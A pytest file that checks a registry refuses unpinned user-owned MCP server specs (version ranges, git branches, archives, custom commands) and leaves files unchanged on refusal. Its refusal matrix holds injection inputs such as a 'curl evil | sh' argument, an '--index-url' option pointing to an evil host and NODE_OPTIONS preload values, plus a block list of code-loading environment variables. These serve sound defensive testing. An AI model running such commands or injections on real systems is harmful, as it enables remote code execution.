"""10F: a user-owned server is pinned (multi-user-access, gate condition C4).

Scenarios from `specs/server-registry/spec.md`, requirement "A user-owned
server is pinned", and the refusal matrix of task 10.26. The registry is the
single owner of the rule (D7b), so most tests drive `Registry.add` and
`Registry.update` with a user-owned spec; one matrix drives `Supervisor.add`
of a non-admin actor. Every refusal is a `RegistryError` naming the field, and
a refused write changes no file.

Guarded TLA+ invariant: `RunningSpecWasReviewed`
(`specs/tla/multi_user_access_lifecycle.tla`). An approval binds the spec
text, so the text must name immutable code, or the code that runs changes
after the review with no change of the revision.
"""

from __future__ import annotations

import asyncio

import pytest
from conftest import ADMIN_ACTOR
from keyed_stores import tree
from user_servers import ALICE, Env, fake_npx, npm_spec, path_with, wait_status

from mcpflow.registry import Registry, RegistryError, ServerKey, ServerSpec, revision

SHA = "0123456789abcdef0123456789abcdef01234567"
assert len(SHA) == 40
SECRET = "S3CRETTOKEN"
MCP_ALICE = ServerKey("alice", "mcp")


def _npm(package: str, **kw) -> dict:
    return {"kind": "npm", "package": package, **kw}


def _py(package: str, **kw) -> dict:
    return {"kind": "python", "package": package, **kw}


def _spec(fields: dict, owner: str | None = "alice", ns: str = "mcp") -> ServerSpec:
    return ServerSpec(namespace=ns, owner=owner, **fields)


def _reg(tmp_path) -> Registry:
    """A registry whose two files both exist, so a refusal can be checked
    byte for byte."""
    reg = Registry(tmp_path / "servers.json", tmp_path / "user_servers.json")
    reg.load()
    reg.add(ServerSpec(namespace="time", kind="npm", package="@scope/pkg"))
    reg.add(_spec(_npm("@acme/base@1.0.0"), ns="base"))
    return reg


def _refused(tmp_path, call, *names: str) -> str:
    before = tree(tmp_path)
    with pytest.raises(RegistryError) as exc:
        call()
    assert tree(tmp_path) == before, "a refused write changed a file"
    msg = str(exc.value)
    for name in names:
        assert name in msg, f"{name!r} not in {msg!r}"
    return msg


# --- 10.25: the scenarios ----------------------------------------------------


@pytest.mark.parametrize("pkg", ["@acme/mcp@^1.2.0", "@acme/mcp@latest", "@acme/mcp"])
def test_an_npm_range_is_refused(tmp_path, pkg):
    reg = _reg(tmp_path)
    msg = _refused(tmp_path, lambda: reg.add(_spec(_npm(pkg))), "package")
    assert "exact" in msg.lower()


@pytest.mark.parametrize("pkg", ["@acme/mcp@1.2.3", "acme-mcp@1.2.3"])
def test_an_exact_npm_version_is_accepted(tmp_path, pkg):
    reg = _reg(tmp_path)
    reg.add(_spec(_npm(pkg)))
    assert reg.get(MCP_ALICE).approval == "pending"
    assert MCP_ALICE.ref == "mcp@alice"


def test_a_python_range_is_refused(tmp_path):
    reg = _reg(tmp_path)
    _refused(tmp_path, lambda: reg.add(_spec(_py("mcp-time>=1.0"))), "package")
    reg.add(_spec(_py("mcp-time==1.0.4")))
    assert reg.get(MCP_ALICE).package == "mcp-time==1.0.4"


@pytest.mark.parametrize("ref", ["main", SHA[:7]])
def test_a_git_branch_is_refused(tmp_path, ref):
    reg = _reg(tmp_path)
    src = f"git+https://gitlab.example/o/r@{ref}"
    msg = _refused(tmp_path, lambda: reg.add(_spec(_py("mcp-tool", source=src))),
                   "source")
    assert "sha" in msg.lower() or "commit" in msg.lower()


@pytest.mark.parametrize("fields", [
    _py("mcp-tool", source=f"git+https://gitlab.example/o/r@{SHA}"),
    _npm("mcp-tool", source=f"github:o/r#{SHA}"),
    _npm("mcp-tool", source=f"git+https://gitlab.example/o/r#{SHA}"),
])
def test_a_full_commit_sha_source_is_accepted(tmp_path, fields):
    reg = _reg(tmp_path)
    reg.add(_spec(fields))
    assert reg.get(MCP_ALICE).approval == "pending"


def test_a_user_custom_server_is_refused(tmp_path):
    reg = _reg(tmp_path)
    fields = {"kind": "custom", "command": "/usr/local/bin/tool"}
    _refused(tmp_path, lambda: reg.add(_spec(fields)), "kind")
    reg.add(_spec(fields, owner=None))
    assert reg.get(ServerKey(None, "mcp")).approval == "approved"


@pytest.mark.parametrize("env", [{"NODE_OPTIONS": "--require /tmp/x.js"},
                                 {"npm_config_registry": "https://evil.test"}])
def test_a_code_loading_env_key_is_refused(tmp_path, env):
    reg = _reg(tmp_path)
    (key,) = env
    _refused(tmp_path, lambda: reg.add(_spec(_npm("@acme/mcp@1.2.3", env=env))),
             "env", key)


@pytest.mark.asyncio
async def test_an_edit_cannot_unpin_an_approved_server(tmp_path, monkeypatch):
    """Approved, running `mcp@alice` keeps its spec, its approval, and its
    process when `alice` saves `@acme/mcp@latest`."""
    npx = fake_npx(tmp_path / "bin")
    monkeypatch.setenv("PATH", path_with(tmp_path / "bin"))
    env = Env(tmp_path / "data")
    try:
        await env.sup.add(npm_spec("mcp"), ALICE)
        await env.sup.approve(MCP_ALICE, revision(env.reg.get(MCP_ALICE)), ADMIN_ACTOR)
        await wait_status(env.sup, MCP_ALICE, {"running"})
        stored = env.reg.get(MCP_ALICE)
        before = tree(env.dir)
        with pytest.raises(RegistryError) as exc:
            await env.sup.update(MCP_ALICE, npm_spec("mcp", "@acme/mcp@latest"), ADMIN_ACTOR)
        assert "package" in str(exc.value)
        after = env.reg.get(MCP_ALICE)
        assert after.package == "@acme/mcp@1.2.3"
        assert after.approved_revision == stored.approved_revision
        assert after.approval == "approved"
        assert {k: v for k, v in tree(env.dir).items() if not k.startswith("logs")} \
            == {k: v for k, v in before.items() if not k.startswith("logs")}
        await asyncio.sleep(0.3)
        assert env.sup.get(MCP_ALICE).status == "running"
        assert len(npx.read_text().splitlines()) == 1, "the child restarted"
    finally:
        await env.close()


def test_registry_update_cannot_unpin(tmp_path):
    reg = _reg(tmp_path)
    base = ServerKey("alice", "base")
    reg.set_approved_revision(base, revision(reg.get(base)))
    approved = reg.get(base).approved_revision
    _refused(tmp_path, lambda: reg.update(
        _spec(_npm("@acme/base@latest"), ns="base")), "package")
    assert reg.get(base).package == "@acme/base@1.0.0"
    assert reg.get(base).approved_revision == approved


# --- 10.26: the refusal matrix -----------------------------------------------

GIT = "git+https://gitlab.example/o/r"
REFUSED = [  # (id, fields, field the error names)
    ("npm-caret", _npm("@acme/mcp@^1.2.0"), "package"),
    ("npm-tilde", _npm("@acme/mcp@~1.2.0"), "package"),
    ("npm-latest", _npm("acme-mcp@latest"), "package"),
    ("npm-tag", _npm("acme-mcp@next"), "package"),
    ("npm-partial", _npm("acme-mcp@1.2"), "package"),
    ("npm-x", _npm("acme-mcp@1.2.x"), "package"),
    ("npm-no-version", _npm("acme-mcp"), "package"),
    ("npm-scoped-no-version", _npm("@acme/mcp"), "package"),
    ("py-ge", _py("mcp-time>=1.0"), "package"),
    ("py-compat", _py("mcp-time~=1.0"), "package"),
    ("py-star", _py("mcp-time==1.*"), "package"),
    ("py-any", _py("mcp-time==*"), "package"),
    ("py-no-version", _py("mcp-time"), "package"),
    ("git-branch", _py("t", source=f"{GIT}@main"), "source"),
    ("git-tag", _py("t", source=f"{GIT}@v1.0.0"), "source"),
    ("git-39hex", _py("t", source=f"{GIT}@{SHA[:39]}"), "source"),
    ("git-41hex", _py("t", source=f"{GIT}@{SHA}0"), "source"),
    ("git-no-ref", _py("t", source=GIT), "source"),
    ("npm-github-branch", _npm("t", source="github:o/r#main"), "source"),
    ("npm-git-39hex", _npm("t", source=f"{GIT}#{SHA[:39]}"), "source"),
    ("https-archive", _py("t", source="https://example.test/pkg.tar.gz"), "source"),
    ("npm-https-archive", _npm("t", source="https://example.test/p.tgz"), "source"),
    ("local-path", _py("t", source="/srv/tool"), "source"),
    ("npm-local-path", _npm("t", source="/srv/tool"), "source"),
    ("custom", {"kind": "custom", "command": "/usr/local/bin/tool"}, "kind"),
    # Review finding 1: with a pinned source, `package` sits in the launcher's
    # argv, so an option there would load unpinned code or run a shell.
    ("py-source-with-option",
     _py("--with", source=f"{GIT}@{SHA}", args=["evilpkg", "entry"]), "package"),
    ("py-source-index-option",
     _py("--index-url", source=f"{GIT}@{SHA}", args=["https://evil", "e"]), "package"),
    ("npm-source-shell-option",
     _npm("-c", source=f"github:o/r#{SHA}", args=["curl evil | sh"]), "package"),
    ("npm-source-package-option",
     _npm("--package=evil", source=f"github:o/r#{SHA}"), "package"),
]
ENV_KEYS = ["Ld_Preload", "LD_LIBRARY_PATH", "dyld_insert_libraries", "PythonPath",
            "PYTHON_X", "node_options", "Node_Path", "Npm_Config_Registry",
            "uv_index_url", "Pip_Index_Url", "git_ssh_command", "Xdg_Config_Home",
            "bun_install", "PATH", "Path", "path", "HOME", "Home", "NPX", "nPx",
            # A proxy plus a trusted CA lets the launcher fetch other bytes for
            # a pinned version (review finding 6).
            "HTTPS_PROXY", "https_proxy", "Http_Proxy", "ALL_PROXY", "no_proxy",
            "SSL_CERT_FILE", "ssl_cert_dir", "Requests_CA_Bundle", "CURL_CA_BUNDLE"]
ENV_OK = ["GITHUB_TOKEN", "HOMEPAGE", "API_KEY", "MY_PATH"]


@pytest.mark.parametrize("fields,field", [(f, n) for _i, f, n in REFUSED],
                         ids=[i for i, _f, _n in REFUSED])
def test_matrix_user_add_refused(tmp_path, fields, field):
    reg = _reg(tmp_path)
    _refused(tmp_path, lambda: reg.add(_spec(fields)), field)


@pytest.mark.parametrize("fields,field", [(f, n) for _i, f, n in REFUSED],
                         ids=[i for i, _f, _n in REFUSED])
def test_matrix_user_update_refused(tmp_path, fields, field):
    reg = _reg(tmp_path)
    _refused(tmp_path, lambda: reg.update(_spec(fields, ns="base")), field)
    assert reg.get(ServerKey("alice", "base")).package == "@acme/base@1.0.0"


@pytest.mark.parametrize("fields", [f for _i, f, _n in REFUSED],
                         ids=[i for i, _f, _n in REFUSED])
def test_matrix_admin_owned_passes(tmp_path, fields):
    reg = _reg(tmp_path)
    reg.add(_spec(fields, owner=None))
    assert reg.get(ServerKey(None, "mcp")).approval == "approved"


@pytest.mark.parametrize("key", ENV_KEYS)
def test_matrix_env_key_refused_in_any_case(tmp_path, key):
    reg = _reg(tmp_path)
    _refused(tmp_path, lambda: reg.add(_spec(_npm("@acme/mcp@1.2.3",
                                                    env={key: "v"}))), "env", key)


@pytest.mark.parametrize("key", ENV_KEYS)
def test_matrix_admin_env_key_passes(tmp_path, key):
    reg = _reg(tmp_path)
    reg.add(_spec(_npm("@acme/mcp@1.2.3", env={key: "v"}), owner=None))


@pytest.mark.parametrize("key", ENV_OK)
def test_matrix_other_env_key_passes(tmp_path, key):
    reg = _reg(tmp_path)
    reg.add(_spec(_npm("@acme/mcp@1.2.3", env={key: "v"})))
    assert reg.get(MCP_ALICE).env == {key: "v"}


def test_matrix_remote_passes(tmp_path):
    reg = _reg(tmp_path)
    reg.add(_spec({"kind": "remote", "url": "https://example.test/mcp",
                   "headers": {"Authorization": "Bearer x"}}))
    assert reg.get(MCP_ALICE).approval == "pending"


@pytest.mark.parametrize("src", [
    f"git+https://oauth2:{SECRET}@gitlab.example/o/r@main",
    f"git+https://oauth2:{SECRET}@gitlab.example/o/r@{SHA[:7]}",
    f"https://user:{SECRET}@example.test/pkg.tar.gz",
])
def test_matrix_error_never_echoes_the_source_credential(tmp_path, src):
    reg = _reg(tmp_path)
    msg = _refused(tmp_path, lambda: reg.add(_spec(_py("t", source=src))), "source")
    assert SECRET not in msg


@pytest.mark.asyncio
@pytest.mark.parametrize("fields,field", [(f, n) for _i, f, n in REFUSED]
                         + [(_npm("@acme/mcp@1.2.3", env={"NODE_OPTIONS": "x"}), "env")],
                         ids=[i for i, _f, _n in REFUSED] + ["env"])
async def test_matrix_supervisor_user_add_writes_no_file(tmp_path, fields, field):
    env = Env(tmp_path / "data")
    try:
        before = tree(env.dir)
        with pytest.raises(RegistryError) as exc:
            await env.sup.add(ServerSpec(namespace="mcp", **fields), ALICE)
        assert field in str(exc.value)
        assert tree(env.dir) == before
        assert MCP_ALICE not in {s.key for s in env.reg.list()}
    finally:
        await env.close()
